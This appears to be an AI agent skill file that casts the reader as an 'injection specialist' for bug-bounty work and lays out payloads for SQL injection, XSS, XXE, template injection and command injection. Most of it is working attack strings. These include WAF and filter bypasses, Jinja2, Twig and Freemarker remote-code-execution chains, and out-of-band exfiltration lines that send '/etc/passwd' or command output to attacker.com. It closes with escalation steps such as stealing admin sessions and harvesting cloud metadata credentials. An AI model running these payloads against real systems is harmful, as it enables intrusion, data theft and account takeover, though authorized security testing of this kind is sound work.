---
name: injection-attacks
description: "Complete guide to SQL injection, XSS, XXE, SSTI, and command injection with bypass techniques"
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# Injection Attacks

You are operating as an injection specialist. Before sending a single payload, understand what context you are injecting into. Two minutes of context identification determines whether you spend the next hour productively or blindly. An injection point with the wrong payload class is just noise.

The best injection bugs come from precise context identification — knowing you are in a JS string context vs an HTML context changes everything about which payloads will execute. Know the context before you commit to a technique.

---

## Phase 0: Context Identification (Do This First)

Before testing any specific injection class, determine which injection context(s) are present. Each has distinct signals.

### Visual Signals

| What you see in the response | Likely context | First test |
|------------------------------|---------------|------------|
| Your input reflected inside `<tag>` content | HTML context | `<svg onload=alert(1)>` |
| Your input inside an attribute value | HTML attribute context | `" onmouseover=alert(1) x="` |
| Your input inside `<script>` tags or a `.js` file | JavaScript string/value context | `';alert(1)//` |
| Your input appears in a URL (href, src, action) | URL context | `javascript:alert(1)` |
| Error with SQL syntax near your input | SQL context | `' AND 1=1--` |
| Your arithmetic evaluated (e.g., `{{7*7}}` → `49`) | Template engine | Engine-specific payloads |
| XML/SOAP response that echoes your input | XML/XXE context | Inject DOCTYPE entity |
| System command output appears in response | Command injection | `; id` |
| No visible output but response timing changes | Blind context | Time-based probes |

### Network Signals (Check These in the Browser Dev Tools / Burp)

| What you see | What it means |
|-------------|---------------|
| `Content-Type: application/json` request with your input in a JSON field | Input goes into backend query or template — test SQLi, SSTI |
| `Content-Type: text/xml` or `application/xml` | XXE surface present |
| Request body is URL-encoded form data | Classic form injection — SQLi, XSS, SSTI common here |
| Input parameter appears unchanged in the response HTML | Reflected — test XSS immediately |
| Input parameter stored and appears on a different page | Stored — higher impact XSS |
| Response includes XML parsing errors | XXE parser likely present |
| Response time increases proportionally to your input value | Time-based blind injection possible |
| File upload that processes the file server-side | XXE in SVG/DOCX/XLSX, SSTI in templated filenames |

### The 3 Probe Sequence (Run Before Any Full Attack)

Send these three probes to every injection-suspect parameter before committing to an attack class. Read the responses carefully — they tell you what context you are in.

**Probe 1 — Polyglot context breaker:**
```
'"<svg/onload=1>{{7*7}}${7*7};--
```
- If the number `49` appears → template injection (SSTI)
- If `<svg` is reflected unescaped → HTML context, XSS possible
- If you get a SQL error → SQL context
- If the response changes vs sending clean input → something is being processed

**Probe 2 — Mathematical evaluation:**
```
{{7*7}}
${7*7}
```
- `49` in response → confirm SSTI, identify engine next
- No change → either escaped or not a template context

**Probe 3 — Time delay (blind confirmation):**
```
' AND SLEEP(5)--
; sleep 5 ;
```
- 5-second delay → blind SQL or command injection confirmed
- No delay → either not injectable or different DB/OS

Only after these probes do you know which attack section below to focus on. Don't brute-force all classes — the probes tell you where to spend time.

---

## SQL Injection

### Context Identification

**Signals that you are in an SQL injection context:**

- Input appears in a data retrieval parameter (`id=`, `user=`, `search=`, `category=`, `order=`)
- Adding `'` causes a database error in the response (`syntax error`, `unterminated string`, `ORA-`, `MySQL`, `PostgreSQL`, `MSSQL`)
- Removing special characters makes the error disappear
- Adding `' AND 1=1--` returns the same result as the clean request
- Adding `' AND 1=2--` returns an empty result or different page

**Less obvious SQLi surfaces:**
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie` values stored in DB
- JSON body fields, especially filter/sort parameters
- GraphQL variables, particularly string filters
- Order-by clauses (numeric injection, not quoted: `ORDER BY 1`, `ORDER BY 1+1`)
- XML/SOAP fields passed to a backend query

### Response Interpretation

| Response | What it means | What to try next |
|----------|--------------|-----------------|
| SQL syntax error with DB name (e.g., `near "''"` or `ORA-00907`) | Direct SQLi, visible error | UNION-based extraction |
| Generic `500 Internal Server Error`, no SQL error | Error suppressed | Boolean-based blind |
| `' AND 1=1--` returns normal, `' AND 1=2--` returns empty | Boolean blind confirmed | Extract data character by character |
| 5-second delay on `' AND SLEEP(5)--` | Time-based blind | MSSQL/MySQL/PostgreSQL time payloads |
| No change at all | Input sanitized or not in SQL | Try URL encoding, hex encoding, alternative delimiters |
| `WAF blocked` / 403 | WAF present | WAF bypass payloads below |
| Columns appear in different positions | UNION display columns found | Map columns, extract target data |

### Decision Framework

1. Send `'` — error? → classic SQLi. Send `' AND 1=1--` and `' AND 1=2--` to confirm boolean response difference.
2. If no visible error: send `' AND SLEEP(5)--` (MySQL) and `'; WAITFOR DELAY '0:0:5'--` (MSSQL) — delay? → blind time-based.
3. If error is visible with full output: try UNION — find column count with `ORDER BY N`, then extract.

### Detection

```
' " ` ) ; -- /* */
' OR '1'='1
' AND '1'='2
' WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

### UNION-Based SQLi

```sql
-- Find column count
' ORDER BY 1--
' ORDER BY 5--   -- Increment until error

-- Find display columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

-- Extract data
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--
```

### Blind Boolean-Based

```sql
-- True condition (normal response)
' AND 1=1--

-- False condition (different response)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x'--
```

### WAF Bypass

```sql
-- Case variation
SeLeCt, sElEcT

-- Comments
SEL/**/ECT, SE/*comment*/LECT

-- URL encoding
%53%45%4c%45%43%54

-- Double encoding
%2553%2545%254c%2545%2543%2554

-- Alternative syntax
1 aNd 1=1, 1 && 1=1

-- Null bytes
SEL%00ECT
```

---

## Cross-Site Scripting (XSS)

### Context Identification

**How to identify which XSS context you are in:**

View page source (not DevTools rendered view — raw source) after submitting your input. Find where your input lands.

| Where input appears in source | Context | Implication |
|-------------------------------|---------|-------------|
| Between HTML tags: `<p>INPUT</p>` | HTML context | Tag injection works |
| Inside a tag attribute: `<input value="INPUT">` | Attribute context | Need to break out of attribute |
| Inside a JS string: `var x = "INPUT";` | JavaScript string | Need to break out of string |
| Inside a JS block but not in a string: `var x = INPUT;` | JavaScript value | Direct JS expression injection |
| In a `href` or `src` attribute: `<a href="INPUT">` | URL context | `javascript:` scheme works |
| In a `<script src="INPUT">` | Script src | Only useful if you control a server |
| Not reflected at all — appears on a different page | Stored XSS | Same contexts, higher impact |

**Reflection fidelity check** — before sending any payload, send: `xsstest123"'<>`
- If all characters appear verbatim → unfiltered, inject freely
- If `"` is escaped to `&quot;` → likely HTML-context escaping, but check JS context separately
- If `<` is escaped to `&lt;` → HTML encoding in place — look for JS-context reflection instead
- If nothing is escaped → check if there's a CSP that would block execution

### Response Interpretation

| What you observe | What it means | What to try next |
|-----------------|--------------|-----------------|
| `alert(1)` fires | Confirmed XSS | Escalate to cookie theft / credential capture |
| Payload appears in source, unescaped, but no alert | CSP blocking execution | Check CSP header, look for JSONP endpoints on allowed domains |
| `<` is HTML-encoded | HTML context is filtered | Check if same input appears in a `<script>` block elsewhere |
| `"` is escaped in attribute | Attribute escaping in place | Try event handler in different attribute, or DOM-based injection |
| `alert` is filtered by keyword | Alert blocked | Try `confirm(1)`, `prompt(1)`, backtick: `alert\`1\`` |
| Script tag stripped | Tag filtering | Try `<svg onload>`, `<img onerror>`, `<body onload>` |
| 403 on payload | WAF | Filter bypass techniques below |
| Input in JS string, but `'` and `"` both escaped | JS context with escaping | Try `\n`, `</script>`, or look for DOM sinks |

### Decision Framework

1. Send `xsstest123"'<>` — check raw source to find all reflection points and which characters survive.
2. Based on context: try the appropriate context-specific payload (see below). Use the simplest payload first (`<svg onload=alert(1)>` for HTML, `';alert(1)//` for JS).
3. If payload is filtered: identify what specific character or keyword is blocked, then apply the minimum bypass needed — don't jump to a complex polyglot when a simple case variant works.

### Contexts & Payloads

**HTML context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Attribute context:**
```html
" onmouseover=alert(1) x="
' onfocus=alert(1) autofocus='
" autofocus onfocus=alert(1) x="
```

**JavaScript context:**
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

**URL context:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>

<!-- Without alert -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- No quotes/spaces -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

### CSP Bypass

- Find JSONP endpoints on allowed domains
- AngularJS with `ng-app` on CSP-allowed CDN
- Check for `unsafe-inline`, `unsafe-eval`
- Base-uri manipulation if not restricted

---

## XML External Entity (XXE)

### Context Identification

**Signals that you are in an XXE context:**

- Request `Content-Type` is `application/xml`, `text/xml`, or `application/soap+xml`
- Response is XML or the app processes XML files
- File upload that accepts SVG, DOCX, XLSX, ODT, PDF (many have XML internally)
- API endpoint that returns XML errors when given malformed input
- SOAP endpoints (`/ws`, `/service`, `/soap`, `/api.asmx`)

**Less obvious XXE surfaces:**
- JSON endpoints that also accept XML (try changing `Content-Type` to `application/xml` and converting the JSON body to XML)
- Image upload endpoints that accept SVG
- Document conversion endpoints
- Any endpoint using an XML parser internally — even if your input is not XML, if it's passed to an XML parser, XXE may apply

**Test whether the parser processes external entities:**
Send a simple internal entity first to confirm XML is being parsed:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY foo "bar">]>
<test>&foo;</test>
```
If `bar` appears in the response → entities are being processed → classic XXE likely works.

### Response Interpretation

| Response | What it means | What to try next |
|----------|--------------|-----------------|
| File contents appear in response (`root:x:0:0:`) | Classic XXE confirmed | Extract sensitive files, pivot to SSRF |
| Entity value appears (`bar` from internal entity test) | Parser processes entities but may block `SYSTEM` | Try `file://` URI, then OOB |
| Empty response where content expected | Blind XXE — file read but not reflected | OOB exfiltration via external DTD |
| `500 Internal Server Error` on entity injection | Parser error — may still be exploitable blind | Try OOB |
| `DOCTYPE not allowed` / `external entity disabled` | XXE disabled explicitly | Try XInclude, or check file upload paths |
| Timeout on `http://attacker.com/` reference | Server made outbound request → SSRF via XXE | Use for internal network probing |
| XML parsing error on modified payload | Parser is strict — check syntax | Double-check entity syntax, try different DTD format |

### Decision Framework

1. Confirm entity processing: send an internal entity `<!ENTITY foo "bar">&foo;` — if `bar` reflects, the parser processes entities.
2. Try classic file read (`file:///etc/passwd`). If that reflects content → done.
3. If no reflection but no error either → blind XXE: set up OOB exfiltration via external DTD hosted on your server.

### Classic XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Blind XXE with OOB

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### XXE in File Uploads

- SVG files: `<svg>` with XXE in XML
- DOCX/XLSX: Unzip, inject XXE in XML files
- PDF: Some parsers vulnerable

---

## Server-Side Template Injection (SSTI)

### Context Identification

**Signals that you are in an SSTI context:**

- The application uses a templating engine on the backend (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Smarty, Handlebars)
- Input is used to render dynamic content: email templates, report generation, preview features, personalized messages
- URL parameters that render page sections or titles
- User-controllable "template" or "message" fields in the app

**Technology fingerprinting:**
- Python apps (Flask, Django) → Jinja2 or Mako
- PHP apps → Twig, Smarty, or Blade
- Java apps → Freemarker, Velocity, Pebble, Thymeleaf
- Node.js apps → Handlebars, Nunjucks, Pug
- Ruby apps → ERB, Slim, Haml

**Confirm SSTI with math evaluation** — math evaluation is safe and confirms the vulnerability without causing side effects:
```
{{7*7}}    → 49 (Jinja2, Twig, Nunjucks)
${7*7}     → 49 (Freemarker, Velocity, Groovy)
#{7*7}     → 49 (Thymeleaf)
<%= 7*7 %> → 49 (ERB)
```

### Response Interpretation

| Response | What it means | What to try next |
|----------|--------------|-----------------|
| `49` from `{{7*7}}` | Jinja2, Twig, or Nunjucks | Test `{{7*'7'}}` to distinguish: Jinja2 returns `7777777`, Twig returns `49` |
| `49` from `${7*7}` | Freemarker or Velocity | Use Freemarker `<#assign>` RCE payload |
| Template syntax reflected literally (e.g., `{{7*7}}` appears in output) | Not SSTI, but may be XSS if HTML-rendered | Test XSS instead |
| `500` error on template syntax | Template syntax recognized but fails to execute | Try alternative syntax for other engines |
| `7777777` from `{{7*'7'}}` | Jinja2 confirmed | Use Jinja2 `__class__.__mro__` RCE chain |
| `49` from `{{7*'7'}}` | Twig confirmed | Use Twig `_self.env` RCE payload |
| Error mentioning `TemplateException` or `freemarker` | Freemarker confirmed | Use `freemarker.template.utility.Execute` payload |

### Decision Framework

1. Send `{{7*7}}` and `${7*7}` — which one evaluates tells you the template syntax family.
2. Send `{{7*'7'}}` to distinguish Jinja2 (returns `7777777`) from Twig (returns `49`).
3. Once engine is identified, use the engine-specific RCE payload below. Do not attempt generic payloads against a known engine — use the correct chain.

### Detection

```
{{7*7}}      → 49 (Jinja2, Twig)
${7*7}       → 49 (Freemarker, Velocity)
#{7*7}       → 49 (Thymeleaf)
*{7*7}       → 49 (Thymeleaf)
{{7*'7'}}    → 7777777 (Jinja2)
```

### Jinja2 RCE

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() }}
```

### Twig RCE

```
{{_self.env.getFilter('exec')}}
{{['id']|filter('system')}}
```

### Freemarker RCE

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
```

---

## Command Injection

### Context Identification

**Signals that you are in a command injection context:**

- The feature description implies OS-level operations: ping, traceroute, DNS lookup, file conversion, image processing, port scanning, archive extraction, URL fetching, certificate generation
- Input is used as a filename, hostname, IP address, or path that gets passed to a system command
- The response includes output that looks like terminal output (file listings, process output, network responses)
- The application processes files server-side (images, documents, archives)
- Error messages contain shell-like output or reference OS-level failures

**High-value surfaces for command injection:**
- Network diagnostic tools (ping, traceroute, nslookup built into the app)
- File conversion or processing (ImageMagick, ffmpeg, wkhtmltopdf, ghostscript)
- Webhook URLs or callback URLs processed server-side
- Export/download features that create files
- Email sending features that call sendmail via shell
- CI/CD pipeline configurations
- Backup or archive features

**Determine whether output is visible:**
Send a command that produces distinct output: `; echo injected_marker_xyz ;`
- If `injected_marker_xyz` appears in the response → output is visible, direct command injection
- If not: use time-based detection (`; sleep 5 ;`) or OOB (DNS callback)

### Response Interpretation

| Response | What it means | What to try next |
|----------|--------------|-----------------|
| Command output appears directly (`uid=33(www-data)`) | Direct command injection confirmed | Extract `/etc/passwd`, environment variables, cloud metadata |
| 5-second delay on `; sleep 5 ;` | Blind command injection via time | Use OOB exfiltration for data extraction |
| DNS callback received on `; nslookup marker.attacker.com ;` | Blind command injection via OOB | Exfiltrate data in DNS subdomains |
| Error message changes with different OS metacharacters | Partial filtering — some chars blocked | Try alternatives: backtick, `$()`, newline |
| All metacharacters blocked | WAF or input sanitization | Try filter bypass payloads below |
| No delay but different response on `; echo xyz ;` | Possibly command injection but output filtered | Try writing to a web-accessible file |
| `Permission denied` in output | RCE confirmed, restricted user | Pivot to read sensitive files, env vars, cloud metadata |

### Decision Framework

1. Send `; echo injected_marker_xyz ;` — does the marker appear in the response? Yes → visible output injection.
2. If no visible output: send `; sleep 5 ;` — does response take 5 seconds longer? Yes → blind time-based.
3. If neither: try OOB with `; nslookup $(whoami).YOUR_BURP_COLLABORATOR.com ;` — DNS callback confirms execution.

### Metacharacters

```bash
; id          # Command separator
| id          # Pipe
& id          # Background
` id `        # Backticks
$( id )       # Command substitution
|| id         # OR
&& id         # AND
\n id         # Newline
```

### Blind Detection

```bash
; sleep 5 ;           # Time delay
| ping -c 5 127.0.0.1 # Time delay
; curl http://attacker.com/`whoami` # OOB
; nslookup `whoami`.attacker.com    # DNS OOB
```

### Filter Bypass

```bash
# Space alternatives
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'\x20';cat${X}/etc/passwd

# Slash alternatives
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
```

---

## Cross-Class Escalation

A single injection finding gains impact when chained:

- SQLi → extract credentials → try credential stuffing on login → account takeover
- SSTI RCE → read `/proc/self/environ` for cloud credentials → pivot to S3/IAM
- Command injection → curl cloud metadata (`169.254.169.254`) → IAM role credentials → full cloud account access
- XXE → SSRF to internal services → probe internal APIs not exposed externally
- XSS stored in admin panel → steal admin session → perform privileged actions

Always ask: what can I reach from here that I could not reach before? That answer determines severity.
